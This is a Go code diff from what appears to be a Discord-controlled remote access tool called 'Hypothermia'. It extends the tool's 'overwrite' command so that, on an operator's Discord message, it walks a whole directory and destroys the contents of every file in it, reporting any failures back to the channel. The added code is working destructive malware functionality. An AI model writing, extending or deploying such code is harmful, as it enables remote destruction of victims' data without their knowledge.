@@ -2,7 +2,9 @@ package commands
 
 import (
 	"Hypothermia/src/utils"
+	"fmt"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"github.com/bwmarrin/discordgo"
@@ -11,12 +13,13 @@ import (
 const (
 	ovUsage string = "[path]"
 
-	ovArgsError   string = "🟥 Expected 1 argument."
-	ovInfoError   string = "🟥 Failed to get info about the path."
-	ovDirError    string = "🟥 Path needs to be a file."
-	ovFailedError string = "🟥 Failed to overwrite file."
+	ovArgsError       string = "🟥 Expected 1 argument."
+	ovInfoError       string = "🟥 Failed to get info about the path."
+	ovWalkError       string = "🟥 Failed to walk the path."
+	ovFailedError     string = "🟥 Failed to overwrite."
+	ovSomeFailedError string = "🟥 Failed to overwrite:\n\n%s"
 
-	ovSuccess string = "🟩 Successfully overwritten file."
+	ovSuccess string = "🟩 Successfully overwritten."
 )
 
 func (*OverwriteCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
@@ -48,7 +51,35 @@ func (*OverwriteCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, a
 	}
 
 	if info.IsDir() {
-		s.ChannelMessageSendReply(m.ChannelID, ovDirError, m.Reference())
+		var failed []string
+
+		err = filepath.WalkDir(path, func(filePath string, entry os.DirEntry, err error) error {
+			if err != nil {
+				failed = append(failed, filePath)
+				return nil
+			}
+
+			if !entry.IsDir() {
+				err := utils.OverwriteFile(filePath)
+				if err != nil {
+					failed = append(failed, filePath)
+				}
+			}
+
+			return nil
+		})
+
+		if err != nil {
+			s.ChannelMessageSendReply(m.ChannelID, ovWalkError, m.Reference())
+			return
+		}
+
+		if len(failed) > 0 {
+			s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(ovSomeFailedError, strings.Join(failed, "\n")), m.Reference())
+			return
+		}
+
+		s.ChannelMessageSendReply(m.ChannelID, ovSuccess, m.Reference())
 		return
 	}
 
